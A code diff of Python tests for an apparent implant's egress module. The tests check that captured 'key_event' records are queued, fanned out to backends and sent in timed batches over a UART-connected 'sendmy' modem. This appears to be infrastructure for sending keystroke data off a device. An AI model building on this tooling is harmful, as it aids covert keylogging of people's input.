@@ -1,4 +1,4 @@
-from egress import Egress, EgressManager
+from egress import Egress, GatewayEgress
 import json
 
 
@@ -18,6 +18,8 @@ class Settings:
     egress_retry_max_ms = 800
     egress_backends = ["log"]
     sendmy_enabled = False
+    sendmy_batch_interval_ms = 0
+    sendmy_batch_size = 32
 
 
 def test_disabled_egress_drops_nothing_into_queue():
@@ -110,10 +112,45 @@ def test_manager_fans_out_to_independent_backends(tmp_path):
     class UART:
         def write(self, line): return len(line)
 
-    manager = EgressManager(settings, sendmy_uart=UART())
+    manager = GatewayEgress(settings, sendmy_uart=UART())
     manager.enqueue({"network_id": "lab", "implant_id": "node-1",
                      "boot_id": "boot", "sequence": 1,
                      "kind": "key_event", "value": "a"})
     assert all(len(backend.queue) == 1 for backend in manager.backends.values())
     manager.flush()
     assert all(len(backend.queue) == 0 for backend in manager.backends.values())
+
+
+def test_manager_sendmy_waits_for_interval(tmp_path):
+    settings = Settings()
+    settings.egress_backends = ["sendmy"]
+    settings.egress_spool_path = str(tmp_path / "egress.json")
+    settings.sendmy_modem_id = "42424242"
+    settings.sendmy_max_message_bytes = 180
+    settings.sendmy_max_pending = 8
+    settings.sendmy_batch_interval_ms = 60000
+    settings.sendmy_spool_path = str(tmp_path / "sendmy.json")
+    settings.sendmy_uart_id = 1
+    settings.sendmy_baudrate = 115200
+    settings.sendmy_tx_pin = 17
+    settings.sendmy_rx_pin = 18
+
+    class UART:
+        def __init__(self): self.lines = []
+        def write(self, line):
+            self.lines.append(line)
+            return len(line)
+
+    uart = UART()
+    manager = GatewayEgress(settings, sendmy_uart=uart)
+    manager.enqueue({"network_id": "lab", "source": "node-1",
+                     "boot_id": "boot", "sequence": 1,
+                     "kind": "key_event", "value": "a"})
+    backend = manager.backends["sendmy"]
+    backend._last_flush_ms = 1000
+    manager.flush(now_ms=2000)
+    assert len(backend.queue) == 1
+    assert uart.lines == []
+    manager.flush(now_ms=61000)
+    assert backend.queue == []
+    assert len(uart.lines) == 1
